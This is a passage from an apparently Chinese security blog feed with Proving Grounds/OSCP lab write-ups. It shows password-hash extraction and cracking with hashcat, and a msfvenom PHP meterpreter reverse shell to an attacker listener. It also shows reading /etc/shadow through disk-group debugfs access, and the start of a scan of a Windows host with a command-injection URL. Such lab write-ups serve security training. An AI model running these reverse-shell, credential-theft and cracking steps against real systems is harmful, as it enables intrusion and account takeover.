class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">list<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">38</span><span class="punctuation">:</span><span class="number">38</span><span class="punctuation">:</span>Mailing List Manager<span class="punctuation">:</span>/var/list<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">irc<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">39</span><span class="punctuation">:</span><span class="number">39</span><span class="punctuation">:</span>ircd<span class="punctuation">:</span>/var/run/ircd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">gnats<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">41</span><span class="punctuation">:</span><span class="number">41</span><span class="punctuation">:</span>Gnats Bug-Reporting System (admin)<span class="punctuation">:</span>/var/lib/gnats<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">nobody<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">65534</span><span class="punctuation">:</span><span class="number">65534</span><span class="punctuation">:</span>nobody<span class="punctuation">:</span>/nonexistent<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">systemd-network<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">100</span><span class="punctuation">:</span><span class="number">102</span><span class="punctuation">:</span>systemd Network Management<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/run/systemd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">systemd-resolve<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">101</span><span class="punctuation">:</span><span class="number">103</span><span class="punctuation">:</span>systemd Resolver<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/run/systemd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">systemd-timesync<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">102</span><span class="punctuation">:</span><span class="number">104</span><span class="punctuation">:</span>systemd Time Synchronization<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/run/systemd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">messagebus<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">103</span><span class="punctuation">:</span><span class="number">106</span><span class="punctuation">:</span><span class="punctuation">:</span>/nonexistent<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">syslog<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">104</span><span class="punctuation">:</span><span class="number">110</span><span class="punctuation">:</span><span class="punctuation">:</span>/home/syslog<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">_apt<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">105</span><span class="punctuation">:</span><span class="number">65534</span><span class="punctuation">:</span><span class="punctuation">:</span>/nonexistent<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">tss<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">106</span><span class="punctuation">:</span><span class="number">111</span><span class="punctuation">:</span>TPM software stack<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/var/lib/tpm<span class="punctuation">:</span>/bin/<span class="literal"><span class="keyword">false</span></span></span><br><span class="line">uuidd<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">107</span><span class="punctuation">:</span><span class="number">112</span><span class="punctuation">:</span><span class="punctuation">:</span>/run/uuidd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">tcpdump<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">108</span><span class="punctuation">:</span><span class="number">113</span><span class="punctuation">:</span><span class="punctuation">:</span>/nonexistent<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">landscape<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">109</span><span class="punctuation">:</span><span class="number">115</span><span class="punctuation">:</span><span class="punctuation">:</span>/var/lib/landscape<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">pollinate<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">110</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span><span class="punctuation">:</span>/var/cache/pollinate<span class="punctuation">:</span>/bin/<span class="literal"><span class="keyword">false</span></span></span><br><span class="line">usbmux<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">111</span><span class="punctuation">:</span><span class="number">46</span><span class="punctuation">:</span>usbmux daemon<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/var/lib/usbmux<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">sshd<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">112</span><span class="punctuation">:</span><span class="number">65534</span><span class="punctuation">:</span><span class="punctuation">:</span>/run/sshd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">systemd-coredump<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">999</span><span class="punctuation">:</span><span class="number">999</span><span class="punctuation">:</span>systemd Core Dumper<span class="punctuation">:</span>/<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">lxd<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">998</span><span class="punctuation">:</span><span class="number">100</span><span class="punctuation">:</span><span class="punctuation">:</span>/var/snap/lxd/common/lxd<span class="punctuation">:</span>/bin/<span class="literal"><span class="keyword">false</span></span></span><br><span class="line">fwupd-refresh<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">113</span><span class="punctuation">:</span><span class="number">117</span><span class="punctuation">:</span>fwupd-refresh user<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/run/systemd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">dora<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">1000</span><span class="punctuation">:</span><span class="number">1000</span><span class="punctuation">:</span><span class="punctuation">:</span>/home/dora<span class="punctuation">:</span>/bin/sh</span><br><span class="line"></span><br><span class="line">cd /home/dora</span><br><span class="line">ls</span><br><span class="line">local.txt</span><br><span class="line"></span><br><span class="line">cat local.txt</span><br><span class="line"></span><br><span class="line">ls -al local.txt</span><br><span class="line">-r-------- <span class="number">1</span> dora dora <span class="number">33</span> Feb <span class="number">16</span> <span class="number">02</span><span class="punctuation">:</span><span class="number">29</span> local.txt</span><br></pre></td></tr></table></figure>

<p>查看<code>etc/passwd</code>发现有用户dora, 在dora主目录中有local.txt文件，但是www-data没有查看权限, 尝试在<code>/var/www/html</code>搜索dora: <code>grep dora * -r</code>, 发现dora hash: <code>$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">$ cd /var/www/html</span><br><span class="line">$ grep dora * -r</span><br><span class="line">filemanager/config/.htusers.php<span class="punctuation">:</span>        array(&#x27;dora&#x27;<span class="punctuation">,</span>&#x27;$<span class="number">2</span>a$<span class="number">08</span>$zyiNvVoP/UuSMgO2rKDtLuox.vYj<span class="number">.3</span>hZPVYq3i4oG3/CtgET7CjjS&#x27;<span class="punctuation">,</span>&#x27;/var/www/html&#x27;<span class="punctuation">,</span>&#x27;http<span class="punctuation">:</span><span class="comment">//localhost&#x27;,&#x27;1&#x27;,&#x27;&#x27;,&#x27;0&#x27;,1),</span></span><br><span class="line">wp-includes/js/plupload/moxie.js<span class="punctuation">:</span>                    /(joli|<span class="punctuation">[</span>kxln<span class="punctuation">]</span>?ubuntu|debian|<span class="punctuation">[</span>open<span class="punctuation">]</span>*suse|gentoo|arch|slackware|fedora|mandriva|centos|pclinuxos|redhat|zenwalk|linpus)<span class="punctuation">[</span>\/\s-<span class="punctuation">]</span>?(<span class="punctuation">[</span>\w\.-<span class="punctuation">]</span>+)*/i<span class="punctuation">,</span></span><br><span class="line">wp-includes/js/plupload/moxie.js<span class="punctuation">:</span>                                                                                        <span class="comment">// Fedora/Mandriva/CentOS/PCLinuxOS/RedHat/Zenwalk/Linpus</span></span><br></pre></td></tr></table></figure>

<p>hashcat 爆破密码得到 <code>doraemon</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">hashcat -h |grep &#x27;$<span class="number">2</span>a&#x27;</span><br><span class="line">hashcat -h |grep &#x27;$<span class="number">2</span>&#x27;</span><br><span class="line">   <span class="number">3200</span> | bcrypt $<span class="number">2</span>*$<span class="punctuation">,</span> Blowfish (Unix)                               | Operating System</span><br><span class="line"></span><br><span class="line">hashcat -m <span class="number">3200</span> dora.hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>ssh登录失败， 只能通过密钥对方式登录</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ssh dora@<span class="number">192.168</span><span class="number">.212</span><span class="number">.16</span></span><br><span class="line">The authenticity of host &#x27;<span class="number">192.168</span><span class="number">.212</span><span class="number">.16</span> (<span class="number">192.168</span><span class="number">.212</span><span class="number">.16</span>)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256<span class="punctuation">:</span>VnMMoSlX8Y0MsU947B2bAEqDX+KmnqpFLFXtLgsOERw.</span><br><span class="line">This host key is known by the following other names/addresses<span class="punctuation">:</span></span><br><span class="line">    ~/.ssh/known_hosts<span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span> <span class="punctuation">[</span>hashed name<span class="punctuation">]</span></span><br><span class="line">Are you sure you want to continue connecting (yes/no/<span class="punctuation">[</span>fingerprint<span class="punctuation">]</span>)? yes</span><br><span class="line">Warning<span class="punctuation">:</span> Permanently added &#x27;<span class="number">192.168</span><span class="number">.212</span><span class="number">.16</span>&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">dora@<span class="number">192.168</span><span class="number">.212</span><span class="number">.16</span><span class="punctuation">:</span> Permission denied (publickey).</span><br></pre></td></tr></table></figure>

<p>但是在反弹的www-data的shell里，无法升级到交互式的shell, pyhthon, script, perl, socat都试过了，都不行，最后使用msf获取到shell可以正常切换用户</p>
<p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.45.234 LPORT=4444 -f raw -o r.php</code>生成msf反弹shell payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">use exploit/multi/fileformat/js_unpacker_eval_injection</span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">View the full module info with the info<span class="punctuation">,</span> or info -d command.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set Lhost tun0</span><br><span class="line">Lhost =&gt; <span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span></span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Started reverse TCP handler on <span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span><span class="punctuation">:</span><span class="number">4444</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Sending stage (<span class="number">39927</span> bytes) to <span class="number">192.168</span><span class="number">.212</span><span class="number">.16</span></span><br><span class="line">se<span class="punctuation">[</span>*<span class="punctuation">]</span> Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span><span class="punctuation">:</span><span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="number">.212</span><span class="number">.16</span><span class="punctuation">:</span><span class="number">37902</span>) at <span class="number">2025</span><span class="number">-02</span><span class="number">-16</span> <span class="number">12</span><span class="punctuation">:</span><span class="number">47</span><span class="punctuation">:</span><span class="number">41</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process <span class="number">34439</span> created.</span><br><span class="line">Channel <span class="number">0</span> created.</span><br><span class="line">su dora</span><br><span class="line">Password<span class="punctuation">:</span> doraemon</span><br><span class="line">id</span><br><span class="line">uid=<span class="number">1000</span>(dora) gid=<span class="number">1000</span>(dora) groups=<span class="number">1000</span>(dora)<span class="punctuation">,</span><span class="number">6</span>(disk)</span><br></pre></td></tr></table></figure>

<h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><h2 id="diskgroup"><a href="#diskgroup" class="headerlink" title="diskgroup"></a>diskgroup</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">id</span><br><span class="line">uid=<span class="number">1000</span>(dora) gid=<span class="number">1000</span>(dora) groups=<span class="number">1000</span>(dora)<span class="punctuation">,</span><span class="number">6</span>(disk)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://vk9-sec.com/disk-group-privilege-escalation/">https://vk9-sec.com/disk-group-privilege-escalation/</a></p>
</blockquote>
<p>dora用户有diskgroup权限</p>
<p>首先查看&#x2F;root挂在磁盘，<code>/dev/mapper/ubuntu--vg-ubuntu--lv</code> 挂在在<code>/</code>目录，执行<code>debugfs /dev/mapper/ubuntu--vg-ubuntu--lv</code></p>
<p>发现无法写文件，无法实现通过写公钥然后通过ssh登录，在&#x2F;root&#x2F;.ssh下也没有公私钥，之后authorized_keys文件</p>
<p>读取&#x2F;etc&#x2F;shadow文件，得到root hash: <code>$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">$ df -h</span><br><span class="line">Filesystem                         Size  Used Avail Use% Mounted on</span><br><span class="line">udev                               <span class="number">947</span>M     <span class="number">0</span>  <span class="number">947</span>M   <span class="number">0</span>% /dev</span><br><span class="line">tmpfs                              <span class="number">199</span>M  <span class="number">1.2</span>M  <span class="number">198</span>M   <span class="number">1</span>% /run</span><br><span class="line">/dev/mapper/ubuntu--vg-ubuntu--lv  <span class="number">9.8</span>G  <span class="number">5.1</span>G  <span class="number">4.3</span>G  <span class="number">55</span>% /</span><br><span class="line">tmpfs                              <span class="number">992</span>M     <span class="number">0</span>  <span class="number">992</span>M   <span class="number">0</span>% /dev/shm</span><br><span class="line">tmpfs                              <span class="number">5.0</span>M     <span class="number">0</span>  <span class="number">5.0</span>M   <span class="number">0</span>% /run/lock</span><br><span class="line">tmpfs                              <span class="number">992</span>M     <span class="number">0</span>  <span class="number">992</span>M   <span class="number">0</span>% /sys/fs/cgroup</span><br><span class="line">/dev/loop0                          <span class="number">62</span>M   <span class="number">62</span>M     <span class="number">0</span> <span class="number">100</span>% /snap/core20/<span class="number">1611</span></span><br><span class="line">/dev/loop2                          <span class="number">50</span>M   <span class="number">50</span>M     <span class="number">0</span> <span class="number">100</span>% /snap/snapd/<span class="number">18596</span></span><br><span class="line">/dev/loop1                          <span class="number">64</span>M   <span class="number">64</span>M     <span class="number">0</span> <span class="number">100</span>% /snap/core20/<span class="number">1852</span></span><br><span class="line">/dev/loop3                          <span class="number">92</span>M   <span class="number">92</span>M     <span class="number">0</span> <span class="number">100</span>% /snap/lxd/<span class="number">24061</span></span><br><span class="line">/dev/loop4                          <span class="number">68</span>M   <span class="number">68</span>M     <span class="number">0</span> <span class="number">100</span>% /snap/lxd/<span class="number">22753</span></span><br><span class="line">/dev/sda2                          <span class="number">1.7</span>G  <span class="number">209</span>M  <span class="number">1.4</span>G  <span class="number">13</span>% /boot</span><br><span class="line">tmpfs                              <span class="number">199</span>M     <span class="number">0</span>  <span class="number">199</span>M   <span class="number">0</span>% /run/user/<span class="number">1000</span></span><br><span class="line">$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv</span><br><span class="line">debugfs <span class="number">1.45</span><span class="number">.5</span> (<span class="number">07</span>-Jan<span class="number">-2020</span>)</span><br><span class="line">debugfs<span class="punctuation">:</span>  mkdir test</span><br><span class="line">mkdir<span class="punctuation">:</span> Filesystem opened read/only</span><br><span class="line">debugfs<span class="punctuation">:</span>  ls /root/.ssh</span><br><span class="line">debugfs<span class="punctuation">:</span>  cd /root/.ssh</span><br><span class="line">debugfs<span class="punctuation">:</span>  ls</span><br><span class="line">authorized_keys</span><br><span class="line"></span><br><span class="line">debugfs<span class="punctuation">:</span>  cat /etc/shadow</span><br><span class="line">root<span class="punctuation">:</span>$<span class="number">6</span>$AIWcIr8PEVxEWgv1$<span class="number">3</span>mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/<span class="number">4.</span>D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.<span class="punctuation">:</span><span class="number">19453</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">daemon<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">bin<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">sys<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">sync<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">games<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">man<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">lp<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">mail<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">news<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">uucp<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">proxy<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">www-data<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">backup<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">list<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">irc<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">gnats<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">nobody<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">systemd-network<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">systemd-resolve<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">systemd-timesync<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">messagebus<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">syslog<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">_apt<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">tss<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">uuidd<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">tcpdump<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">landscape<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">pollinate<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">usbmux<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19381</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">sshd<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19381</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">systemd-coredump<span class="punctuation">:</span>!!<span class="punctuation">:</span><span class="number">19381</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">lxd<span class="punctuation">:</span>!<span class="punctuation">:</span><span class="number">19381</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">fwupd-refresh<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19381</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">dora<span class="punctuation">:</span>$<span class="number">6</span>$PkzB/mtNayFM5eVp$b6LU19HBQaOqbTehc6/LEk8DC2NegpqftuDDAvOK20c6yf3dFo0esC0vOoNWHqvzF0aEb3jxk39sQ/S4vGoGm/<span class="punctuation">:</span><span class="number">19453</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br></pre></td></tr></table></figure>

<p>爆破得到密码 <code>explorer</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">hashcat -h |grep &#x27;$<span class="number">6</span>&#x27;</span><br><span class="line">   <span class="number">1800</span> | sha512crypt $<span class="number">6</span>$<span class="punctuation">,</span> SHA512 (Unix)                             | Operating System</span><br><span class="line">  <span class="number">22921</span> | RSA/DSA/EC/OpenSSH Private Keys ($<span class="number">6</span>$)                      | Private Key</span><br><span class="line"></span><br><span class="line">hashcat -m <span class="number">1800</span> root.hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
<li>提权是看到了 dora 有权限 6(disk)， 甚至linpeas中都有黄色背景的利用标识，为什么还是先给忽略了?<br>还是优先尝试自己熟悉的东西，要从最明显的开始</li>
</ol>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Kavin</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<h1 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-128.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">- os</span><br><span class="line">OS<span class="punctuation">:</span> Windows <span class="number">7</span> Ultimate N <span class="number">7600</span></span><br><span class="line">OS version<span class="punctuation">:</span> &#x27;<span class="number">6.1</span>&#x27;</span><br><span class="line">OS release<span class="punctuation">:</span> &#x27;&#x27;</span><br><span class="line">OS build<span class="punctuation">:</span> &#x27;<span class="number">7600</span>&#x27;</span><br><span class="line">Native OS<span class="punctuation">:</span> Windows <span class="number">7</span> Ultimate N <span class="number">7600</span></span><br><span class="line">Native LAN manager<span class="punctuation">:</span> Windows <span class="number">7</span> Ultimate N <span class="number">6.1</span></span><br><span class="line"></span><br><span class="line">- ports</span><br><span class="line">- <span class="number">80</span></span><br><span class="line">    HTTPServer<span class="punctuation">[</span>GoAhead-Webs<span class="punctuation">]</span></span><br><span class="line">    HP Power Manager</span><br><span class="line">    Cyclade</span><br><span class="line">    + /cgi-bin/dose.pl?daily&amp;somefile.txt&amp;|ls|<span class="punctuation">:</span> DailyDose <span class="number">1.1</span> is vulnerable to a directory traversal attack in the &#x27;list&#x27; parameter. See<span class="punctuation">:</span> OSVDB<span class="number">-2799</span></span><br><span class="line">    + 